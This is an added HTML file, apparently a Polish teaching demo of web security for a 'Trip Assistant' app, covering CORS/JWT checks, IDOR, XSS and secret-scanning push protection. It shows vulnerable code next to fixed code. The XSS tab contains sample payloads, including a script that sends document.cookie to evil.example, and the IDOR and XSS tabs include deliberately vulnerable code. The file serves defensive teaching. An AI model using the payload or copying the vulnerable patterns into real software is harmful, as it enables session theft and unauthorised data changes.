@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Trip Assistant – pokaz praktyczny: bezpieczeństwo</title>
+<link href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:wght@400;600;800&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#f2f6f4;--card:#fff;--ink:#12302b;--mute:#4d6661;--line:#cfdcd7;--mark:#e9b824;--blue:#2a6a9c;--ok:#1d7a4d;--bad:#b3362b;--code:#10231f;--codeink:#d8ece5;--okbg:rgba(60,200,120,.25);--badbg:rgba(255,100,85,.28);
+box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#0e1c1a;--card:#152826;--ink:#e3f0eb;--mute:#9bb5ae;--line:#2a4440;--mark:#f0c443;--blue:#6fb2e3;--ok:#58d08f;--bad:#ff7b6e}}
+:root[data-theme="dark"]{--bg:#0e1c1a;--card:#152826;--ink:#e3f0eb;--mute:#9bb5ae;--line:#2a4440;--mark:#f0c443;--blue:#6fb2e3;--ok:#58d08f;--bad:#ff7b6e}
+html{scroll-padding-top:env(safe-area-inset-top,0px)}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--ink);font:16px/1.55 "Bricolage Grotesque",system-ui,sans-serif}
+.wrap{max-width:1100px;margin:0 auto;padding:28px 20px 48px}
+h1{font-size:clamp(1.8rem,5vw,2.8rem);font-weight:800;letter-spacing:-.02em;margin:0 0 6px;line-height:1.1}
+h3{font-size:1.05rem;margin:0 0 6px}
+p{margin:0 0 10px}.lead{color:var(--mute);max-width:70ch}
+code,.mono{font-family:"IBM Plex Mono",ui-monospace,monospace;font-size:.9em}
+.tabs{display:flex;flex-wrap:wrap;gap:8px;margin:20px 0 14px}
+.tabs button{font:600 .95rem "Bricolage Grotesque",sans-serif;padding:9px 16px;border-radius:10px;border:1.5px solid var(--line);background:var(--card);color:var(--ink);cursor:pointer}
+.tabs button[aria-selected="true"]{background:var(--ink);color:var(--bg);border-color:var(--ink)}
+button:focus-visible,input:focus-visible,select:focus-visible{outline:3px solid var(--blue);outline-offset:2px}
+.panel[hidden]{display:none}
+.demo{display:grid;grid-template-columns:minmax(0,.9fr) minmax(0,1.1fr);gap:16px}
+.box{background:var(--card);border:1.5px solid var(--line);border-radius:14px;padding:18px}
+.row{display:flex;flex-wrap:wrap;gap:10px;align-items:center;margin:10px 0}
+label{font-size:.9rem;color:var(--mute);display:flex;flex-direction:column;gap:3px}
+select,input[type=text]{font:inherit;padding:8px 10px;border-radius:8px;border:1.5px solid var(--line);background:var(--bg);color:var(--ink);max-width:100%}
+.btn{font:600 .95rem "Bricolage Grotesque",sans-serif;padding:9px 16px;border-radius:10px;border:0;background:var(--blue);color:#fff;cursor:pointer}
+.btn.r{background:var(--bad);color:#fff}.btn.g{background:var(--ok);color:#fff}.btn.o{background:transparent;color:var(--ink);border:1.5px solid var(--line)}
+.res{margin-top:8px;padding:12px 14px;border-radius:10px;font:.85rem/1.5 "IBM Plex Mono",monospace;border:2px solid var(--line);min-height:56px;white-space:pre-wrap;overflow-wrap:anywhere}
+.res.ok{border-color:var(--ok);color:var(--ok)}.res.bad{border-color:var(--bad);color:var(--bad)}
+.code{background:var(--code);color:var(--codeink);border-radius:10px;padding:8px 0;font:.78rem/1.6 "IBM Plex Mono",monospace;overflow:auto;max-height:380px;position:relative}
+.ln{display:flex;white-space:pre;padding-right:14px;border-left:4px solid transparent}
+.ln .n{flex:0 0 34px;text-align:right;padding-right:12px;color:#6b8a82;user-select:none}
+.ln.ok{background:var(--okbg);border-left-color:#3cc878}
+.ln.bad{background:var(--badbg);border-left-color:#ff6455}
+.cap{margin-top:10px;padding:10px 12px;border-radius:10px;background:var(--bg);border:1.5px dashed var(--line);font-size:.9rem;min-height:48px}
+.cap b{font-family:"IBM Plex Mono",monospace;font-weight:500}
+table{border-collapse:collapse;width:100%;font-size:.9rem}
+td,th{border-bottom:1px solid var(--line);padding:5px 8px;text-align:left}
+.term{background:#091513;color:#d8ece5;border-radius:10px;padding:12px 14px;font:.8rem/1.6 "IBM Plex Mono",monospace;min-height:190px;white-space:pre-wrap;overflow-x:auto}
+.term .e{color:#ff8f84}.term .o{color:#66dd9c}
+.legend{font-size:.85rem;color:var(--mute)}
+.legend i{display:inline-block;width:12px;height:12px;border-radius:3px;vertical-align:-1px;margin:0 4px 0 10px}
+@media (max-width:820px){.demo{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>Pokaz praktyczny: bezpieczeństwo Trip Assistant</h1>
+  <p class="lead">Wykonaj akcję po lewej. Po prawej podświetli się dokładnie ta część kodu, która wywołała taki wynik. Wersje podatne i poprawne można przełączać.</p>
+  <p class="legend"><i style="background:var(--okbg);border:1px solid #3cc878"></i>kod, który zadziałał jako zabezpieczenie<i style="background:var(--badbg);border:1px solid #ff6455"></i>kod, który zablokował żądanie lub jest luką</p>
+
+  <div class="tabs" role="tablist">
+    <button role="tab" aria-selected="true" data-t="cors">1. CORS i autoryzacja</button>
+    <button role="tab" aria-selected="false" data-t="idor">2. IDOR</button>
+    <button role="tab" aria-selected="false" data-t="xss">3. XSS</button>
+    <button role="tab" aria-selected="false" data-t="git">4. Push Protection</button>
+  </div>
+
+  <!-- CORS -->
+  <div class="panel demo" id="p-cors">
+    <div class="box">
+      <h3>Żądanie z przeglądarki do API</h3>
+      <p class="legend">Kolejność kontroli: origin, metoda, token JWT.</p>
+      <div class="row">
+        <label>Origin strony<select id="c-o"><option>https://localhost:5173</option><option>https://evil.example</option></select></label>
+        <label>Metoda<select id="c-m"><option>GET</option><option>DELETE</option><option>PUT</option></select></label>
+        <label>Nagłówek Authorization<select id="c-t"><option value="none">brak</option><option value="bad">Bearer sfałszowany</option><option value="good">Bearer poprawny</option></select></label>
+      </div>
+      <button class="btn" id="c-go">Wyślij żądanie</button>
+      <div class="res" id="c-res">Wybierz parametry i wyślij.</div>
+    </div>
+    <div class="box"><h3>Kod: <code>modules/auth/</code> i <code>main.py</code></h3><div class="code" id="c-code"></div><div class="cap" id="c-cap">Tu pojawi się wskazanie linii odpowiedzialnych za wynik.</div></div>
+  </div>
+
+  <!-- IDOR -->
+  <div class="panel demo" id="p-idor" hidden>
+    <div class="box">
+      <h3>Edycja i usuwanie cudzej wyprawy po ID</h3>
+      <div class="row">
+        <label>Zalogowany jako<select id="i-u"><option>alice</option><option>bob</option></select></label>
+        <label>Kod backendu<select id="i-v"><option value="safe">z kontrolą właściciela</option><option value="vuln">bez kontroli (podatny)</option></select></label>
+        <label>Odpowiedź dla cudzej<select id="i-p"><option>404</option><option>403</option></select></label>
+      </div>
+      <table><thead><tr><th>ID</th><th>Nazwa</th><th>Właściciel</th></tr></thead><tbody id="i-tb"></tbody></table>
+      <div class="row">
+        <label>ID wyprawy<input type="text" id="i-id" value="3" size="4" inputmode="numeric"></label>
+        <button class="btn" id="i-patch">PATCH</button><button class="btn r" id="i-del">DELETE</button><button class="btn o" id="i-reset">Reset danych</button>
+      </div>
+      <div class="res" id="i-res">Jako alice spróbuj usunąć wyprawę o ID 3 (należy do bob).</div>
+    </div>
+    <div class="box"><h3>Kod: <code>modules/trips/</code></h3><div class="code" id="i-code"></div><div class="cap" id="i-cap">Tu pojawi się wskazanie linii odpowiedzialnych za wynik.</div></div>
+  </div>
+
+  <!-- XSS -->
+  <div class="panel demo" id="p-xss" hidden>
+    <div class="box">
+      <h3>Wyświetlanie notatki użytkownika</h3>
+      <div class="row">
+        <label>Treść notatki<select id="x-p">
+          <option value="Piękny szczyt, wschód o 6:10">zwykły tekst</option>
+          <option value="&lt;img src=x onerror=alert(document.cookie)&gt;">&lt;img onerror&gt;</option>
+          <option value="&lt;script&gt;fetch('https://evil.example/?c='+document.cookie)&lt;/script&gt;">&lt;script&gt; kradnący cookie</option></select></label>
+        <label>Kod frontendu<select id="x-v"><option value="safe">textContent (bezpieczny)</option><option value="vuln">innerHTML (podatny)</option></select></label>
+      </div>
+      <button class="btn" id="x-go">Wyświetl wpis</button>
+      <p class="legend" style="margin-top:10px">Poniżej wygenerowany fragment DOM (jako tekst, nic się tu nie wykonuje):</p>
+      <div class="res" id="x-dom">–</div>
+      <div class="res" id="x-res">Wybierz notatkę i wyświetl wpis.</div>
+    </div>
+    <div class="box"><h3>Kod: <code>frontend/src/modules/entries/</code></h3><div class="code" id="x-code"></div><div class="cap" id="x-cap">Tu pojawi się wskazanie linii odpowiedzialnych za wynik.</div></div>
+  </div>
+
+  <!-- GIT -->
+  <div class="panel demo" id="p-git" hidden>
+    <div class="box">
+      <h3>git push z kluczem API</h3>
+      <div class="row"><button class="btn r" id="g-bad">1. Push z kluczem w kodzie</button><button class="btn g" id="g-good">2. Push z kluczem w .env</button></div>
+      <div class="term" id="g-term">$ _</div>
+      <p class="legend" style="margin-top:10px">Klucz w pokazie jest fikcyjny. Prawdziwy sekret, który trafił do historii, trzeba unieważnić u dostawcy.</p>
+    </div>
+    <div class="box"><h3>Kod w repozytorium</h3><div class="code" id="g-code"></div><div class="cap" id="g-cap">Tu pojawi się wskazanie linii odpowiedzialnych za wynik.</div></div>
+  </div>
+</div>
+
+<script>
+const $=id=>document.getElementById(id);
+function render(box,lines){
+  box.textContent='';
+  lines.forEach((l,i)=>{const d=document.createElement('div');d.className='ln';d.dataset.g=l[1]||'';
+    const n=document.createElement('span');n.className='n';n.textContent=i+1;
+    const c=document.createElement('span');c.textContent=l[0];d.append(n,c);box.appendChild(d)});
+}
+function hl(box,cap,g,kind,msg){
+  const all=[...box.querySelectorAll('.ln')];
+  all.forEach(d=>d.classList.remove('ok','bad'));
+  const hit=all.filter(d=>d.dataset.g===g);
+  hit.forEach(d=>d.classList.add(kind));
+  const nums=hit.map(d=>d.querySelector('.n').textContent);
+  cap.textContent='';
+  const b=document.createElement('b');b.textContent='linie '+nums.join(', ')+': ';
+  cap.append(b,document.createTextNode(msg));
+  if(hit[0])box.scrollTop=Math.max(0,hit[0].offsetTop-60);
+}
+function res(el,txt,cls){el.textContent=txt;el.className='res '+(cls||'')}
+document.querySelectorAll('.tabs button').forEach(b=>b.onclick=()=>{
+  document.querySelectorAll('.tabs button').forEach(x=>x.setAttribute('aria-selected',x===b));
+  document.querySelectorAll('.panel').forEach(p=>p.hidden=p.id!=='p-'+b.dataset.t);
+});
+
+/* ---------- CORS ---------- */
+const corsCode=[
+["# main.py",""],
+["app.add_middleware(",""],
+["    CORSMiddleware,",""],
+["    allow_origins=settings.CORS_ORIGINS,","origin"],
+["    allow_credentials=True,",""],
+["    allow_methods=['GET', 'POST', 'PATCH'],","method"],
+["    allow_headers=['Authorization', 'Content-Type'],",""],
+[")",""],
+["",""],
+["# modules/auth/dependencies.py",""],
+["oauth2_scheme = OAuth2PasswordBearer(tokenUrl='/auth/login')","none"],
+["",""],
+["async def current_user(token=Depends(oauth2_scheme),","none"],
+["                       db=Depends(get_db)):",""],
+["    try:",""],
+["        data = jwt.decode(token, settings.JWT_SECRET,","ok"],
+["                          algorithms=['HS256'])","ok"],
+["    except JWTError:","badtok"],
+["        raise HTTPException(401)","badtok"],
+["    user = await db.get(User, data['sub'])","ok"],
+["    if not user:",""],
+["        raise HTTPException(401)",""],
+["    return user","ok"],
+["",""],
+["# .env  (poza gitem)",""],
+["CORS_ORIGINS=https://localhost:5173",""]
+];
+render($('c-code'),corsCode);
+$('c-go').onclick=()=>{
+  const o=$('c-o').value,m=$('c-m').value,t=$('c-t').value,out=$('c-res'),box=$('c-code'),cap=$('c-cap');
+  const line=m+' /api/trips   Origin: '+o+'\n';
+  if(o!=='https://localhost:5173'){res(out,line+'→ przeglądarka blokuje odpowiedź (brak Access-Control-Allow-Origin)','bad');
+    hl(box,cap,'origin','bad','origin spoza listy CORS_ORIGINS nie dostaje nagłówka zezwalającego, więc cudza strona nie odczyta odpowiedzi.');return}
+  if(!['GET','POST','PATCH'].includes(m)){res(out,line+'→ 400 Disallowed CORS method','bad');
+    hl(box,cap,'method','bad','allow_methods to jawna lista. Metoda '+m+' nie jest na niej, więc preflight jest odrzucony.');return}
+  if(t==='none'){res(out,line+'→ 401 Not authenticated','bad');
+    hl(box,cap,'none','bad','OAuth2PasswordBearer wymaga nagłówka Authorization. Bez niego FastAPI zwraca 401, zanim wykona się kod endpointu.');return}
+  if(t==='bad'){res(out,line+'→ 401 Unauthorized (token niepoprawny)','bad');
+    hl(box,cap,'badtok','bad','jwt.decode sprawdza podpis i algorytm. Sfałszowany token rzuca JWTError, a handler zamienia to na 401.');return}
+  res(out,line+'→ 200 OK (użytkownik zidentyfikowany)','ok');
+  hl(box,cap,'ok','ok','poprawny podpis, istniejący użytkownik. current_user zwraca obiekt User, który dostają endpointy modułów.');
+};
+
+/* ---------- IDOR ---------- */
+const iSafe=[
+["# modules/trips/service.py",""],
+["async def get_owned_trip(db, trip_id, user):","auth"],
+["    trip = await db.get(Trip, trip_id)","load"],
+["    if trip is None:","nf"],
+["        raise HTTPException(404)","nf"],
+["    if trip.owner_id != user.id:","own"],
+["        raise HTTPException(settings.IDOR_STATUS)  # 404 lub 403","own"],
+["    return trip","ok"],
+["",""],
+["# modules/trips/router.py",""],
+["@router.delete('/trips/{trip_id}', status_code=204)",""],
+["async def delete_trip(trip_id: int, user=Depends(current_user),","auth"],
+["                      db=Depends(get_db)):",""],
+["    trip = await get_owned_trip(db, trip_id, user)","ok"],
+["    await db.delete(trip)","ok"],
+["",""],
+["# update_trip (PATCH) używa tego samego get_owned_trip",""]
+];
+const iVuln=[
+["# modules/trips/router.py  (WERSJA PODATNA)",""],
+["@router.delete('/trips/{trip_id}', status_code=204)",""],
+["async def delete_trip(trip_id: int, user=Depends(current_user),",""],
+["                      db=Depends(get_db)):",""],
+["    trip = await db.get(Trip, trip_id)","vuln"],
+["    # brak porównania trip.owner_id z user.id","vuln"],
+["    await db.delete(trip)","vuln"]
+];
+const iData=()=>[{id:1,n:'Tatry, wrzesień',o:'alice'},{id:2,n:'Bieszczady',o:'alice'},{id:3,n:'Dolomity',o:'bob'},{id:4,n:'Jura Krakowsko-Częstochowska',o:'bob'}];
+let trips=iData();
+function iTable(){const tb=$('i-tb');tb.textContent='';trips.forEach(t=>{const r=tb.insertRow();[t.id,t.n,t.o].forEach(v=>r.insertCell().textContent=v)})}
+function iCode(){render($('i-code'),$('i-v').value==='safe'?iSafe:iVuln)}
+iTable();iCode();
+$('i-v').onchange=iCode;
+$('i-reset').onclick=()=>{trips=iData();iTable();res($('i-res'),'Dane przywrócone.','');};
+function idor(method){
+  const u=$('i-u').value,raw=$('i-id').value,id=parseInt(raw,10),v=$('i-v').value,pol=$('i-p').value;
+  const box=$('i-code'),cap=$('i-cap'),out=$('i-res');
+  const t=trips.find(x=>x.id===id);
+  const head=method+' /api/trips/'+(isNaN(id)?'?':id)+'   (zalogowany: '+u+')\n';
+  if(v==='vuln'){
+    if(!t){res(out,head+'→ 404 Not Found','bad');hl(box,cap,'vuln','bad','get zwraca None, ale to jedyna kontrola. Nie ma żadnego sprawdzenia właściciela.');return}
+    if(method==='DELETE'){trips=trips.filter(x=>x.id!==id);iTable()}
+    res(out,head+'→ '+(method==='DELETE'?'204 No Content':'200 OK')+'\nLUKA: '+u+' zmienił wyprawę użytkownika '+t.o+'.','bad');
+    hl(box,cap,'vuln','bad','endpoint pobiera rekord po ID i od razu go modyfikuje. Kto zna ID, ten może zmieniać cudze dane.');return}
+  if(!t){res(out,head+'→ 404 Not Found','ok');hl(box,cap,'nf','ok','wyprawa o takim ID nie istnieje, więc get_owned_trip przerywa z 404.');return}
+  if(t.o!==u){res(out,head+'→ '+pol+(pol==='404'?' Not Found':' Forbidden')+'\nDostęp zablokowany, dane bez zmian.','ok');
+    hl(box,cap,'own','ok','owner_id rekordu różni się od id zalogowanego użytkownika. Status '+pol+' pochodzi z IDOR_STATUS. 404 dodatkowo ukrywa, że takie ID istnieje.');return}
+  if(method==='DELETE'){trips=trips.filter(x=>x.id!==id);iTable()}
+  res(out,head+'→ '+(method==='DELETE'?'204 No Content':'200 OK')+'\nTo Twoja wyprawa, operacja dozwolona.','');
+  hl(box,cap,'ok','ok','właściciel się zgadza, get_owned_trip zwraca rekord i endpoint wykonuje operację.');
+}
+$('i-patch').onclick=()=>idor('PATCH');$('i-del').onclick=()=>idor('DELETE');
+
+/* ---------- XSS ---------- */
+const xSafe=[
+["// frontend/src/modules/entries/EntryCard.js",""],
+["export function renderEntry(entry, el) {",""],
+["  const p = document.createElement('p');",""],
+["  p.className = 'entry-note';",""],
+["  p.textContent = entry.note;","safe"],
+["  el.replaceChildren(p);","safe"],
+["}",""],
+["",""],
+["// HTML z AI (markdown) zawsze przez sanitizer:",""],
+["el.innerHTML = DOMPurify.sanitize(summaryHtml);","san"]
+];
+const xVuln=[
+["// frontend/src/modules/entries/EntryCard.js  (PODATNY)",""],
+["export function renderEntry(entry, el) {",""],
+["  el.innerHTML = `<p class=\"entry-note\">${entry.note}</p>`;","vuln"],
+["}",""]
+];
+function xCode(){render($('x-code'),$('x-v').value==='safe'?xSafe:xVuln)}
+xCode();$('x-v').onchange=xCode;
+$('x-go').onclick=()=>{
+  const note=$('x-p').value,v=$('x-v').value,tag=/<[a-z!\/]/i.test(note);
+  $('x-dom').textContent=v==='safe'?'<p class="entry-note">'+note.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')+'</p>':'<p class="entry-note">'+note+'</p>';
+  if(v==='safe'){res($('x-res'),'Widoczne na ekranie jako zwykły tekst:\n'+note,'ok');
+    hl($('x-code'),$('x-cap'),'safe','ok','textContent wstawia wartość jako tekst, nie jako znaczniki. Znaki < i > nie tworzą elementów, więc payload nic nie wykona.');return}
+  if(tag){res($('x-res'),'LUKA: przeglądarka sparsowałaby notatkę jako HTML i wykonała kod atakującego (np. onerror lub script) w sesji ofiary. W pokazie nic się nie wykonuje.','bad');
+    hl($('x-code'),$('x-cap'),'vuln','bad','szablon z ${entry.note} wstawiony przez innerHTML. Dane użytkownika stają się kodem HTML.');return}
+  res($('x-res'),'Widoczne na ekranie: '+note+'\nZwykły tekst działa, ale ta sama ścieżka jest podatna na znaczniki.','');
+  hl($('x-code'),$('x-cap'),'vuln','bad','ten kod jest podatny, nawet gdy konkretny wpis wygląda niewinnie.');
+};
+
+/* ---------- Git ---------- */
+const gBad=[
+["# modules/assistant/service.py",""],
+["from llm_sdk import LLMClient",""],
+["",""],
+["LLM_API_KEY = \"AKIAEXAMPLEFAKEKEY0000\"","secret"],
+["client = LLMClient(api_key=LLM_API_KEY)",""]
+];
+const gGood=[
+["# modules/assistant/service.py",""],
+["client = LLMClient(api_key=settings.LLM_API_KEY)","use"],
+["",""],
+["# core/settings.py",""],
+["class Settings(BaseSettings):",""],
+["    LLM_API_KEY: str","env"],
+["    model_config = {'env_file': '.env'}","env"],
+["",""],
+["# .gitignore",""],
+[".env","ign"],
+["",""],
+["# .env.example  (w repo, bez wartości)",""],
+["LLM_API_KEY=",""]
+];
+render($('g-code'),gBad);
+const term=$('g-term');
+function type(lines,done){
+  term.textContent='';let i=0;
+  (function next(){
+    if(i>=lines.length){done&&done();return}
+    const s=document.createElement('span');s.className=lines[i][0];s.textContent=lines[i][1]+'\n';
+    term.appendChild(s);i++;setTimeout(next,320);
+  })();
+}
+$('g-bad').onclick=()=>{
+  render($('g-code'),gBad);
+  type([['','$ git add . && git commit -m "add assistant"'],['','$ git push origin main'],
+  ['e','remote: error: GH013: Repository rule violations found for refs/heads/main.'],
+  ['e','remote: - GITHUB PUSH PROTECTION'],
+  ['e','remote:   Push cannot contain secrets (cloud provider access key)'],
+  ['e','remote:   location: modules/assistant/service.py:4'],
+  ['e',' ! [remote rejected] main -> main (push declined)']],
+  ()=>hl($('g-code'),$('g-cap'),'secret','bad','sekret w literale. GitHub skanuje commity i odrzuca push, zanim klucz trafi do repozytorium. Komunikat wskazuje plik i numer linii.'));
+};
+$('g-good').onclick=()=>{
+  render($('g-code'),gGood);
+  type([['','$ git reset --soft HEAD~1      # usuń commit z kluczem'],
+  ['','$ echo "LLM_API_KEY=..." >> .env   # tylko lokalnie'],
+  ['','$ git check-ignore .env'],['','.env'],
+  ['','$ git add . && git commit -m "assistant: klucz z settings"'],
+  ['','$ git push origin main'],
+  ['o','To github.com:team/trip-assistant.git'],['o','   3f9c2ab..8d41e07  main -> main']],
+  ()=>{hl($('g-code'),$('g-cap'),'env','ok','Settings czyta klucz z zmiennej środowiskowej lub pliku .env. W kodzie nie ma żadnej wartości.');
+    setTimeout(()=>hl($('g-code'),$('g-cap'),'ign','ok','.env jest w .gitignore, więc plik z sekretem nigdy nie trafia do commita. W repo zostaje tylko .env.example.'),2600)});
+};
+</script>
+</body>
+</html>
